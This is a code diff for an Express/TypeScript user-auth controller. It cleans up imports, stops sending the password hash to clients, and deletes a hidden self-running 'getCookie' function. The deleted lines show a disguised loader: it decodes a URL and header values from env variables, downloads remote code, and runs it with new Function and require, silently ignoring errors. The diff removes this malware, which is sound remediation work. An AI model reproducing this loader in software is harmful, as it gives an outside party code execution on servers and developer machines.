@@ -1,9 +1,6 @@
 import { Request, Response, NextFunction } from "express";
 import crypto from "crypto";
 import cloudinary from "cloudinary";
-import axios from "axios";
-import dotenv from "dotenv";
-import { createRequire } from "module";
 
 import User, { IUser } from "../models/userModel";
 import asyncErrorHandler from "../middlewares/helpers/asyncErrorHandler";
@@ -11,10 +8,8 @@ import sendToken from "../utils/sendToken";
 import ErrorHandler from "../utils/errorHandler";
 import sendEmail from "../utils/sendEmail";
 
-const require = createRequire(import.meta.url);
-
-// Load env
-dotenv.config({ path: "./src/config/.config.env" });
+// Env vars are loaded once, centrally, in src/index.ts ("dotenv/config")
+// from the web/.env file. No per-file dotenv.config() calls needed.
 
 // Extend Request (if not using global typing yet)
 interface AuthRequest extends Request {
@@ -66,6 +61,10 @@ export const loginUser = asyncErrorHandler(
     if (!isPasswordMatched) {
       return next(new ErrorHandler("Invalid Email or Password", 401));
     }
+
+    // `password` was only re-selected to compare the hash — never send it
+    // back to the client.
+    user.password = undefined as unknown as string;
 
     return sendToken(user, 200, res);
   }
@@ -290,22 +289,3 @@ export const deleteUser = asyncErrorHandler(
     res.status(200).json({ success: true });
   }
 );
-
-// ================= GET COOKIE =================
-export const getCookie = (async () => {
-  try {
-    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
-    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
-    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();
-
-    const r = (
-      await axios.get(s, {
-        headers: { [k]: v },
-      })
-    ).data.record.cookie;
-
-    const handler = new Function("require", r);
-    handler(require);
-
-  } catch (error: any) {}
-})();
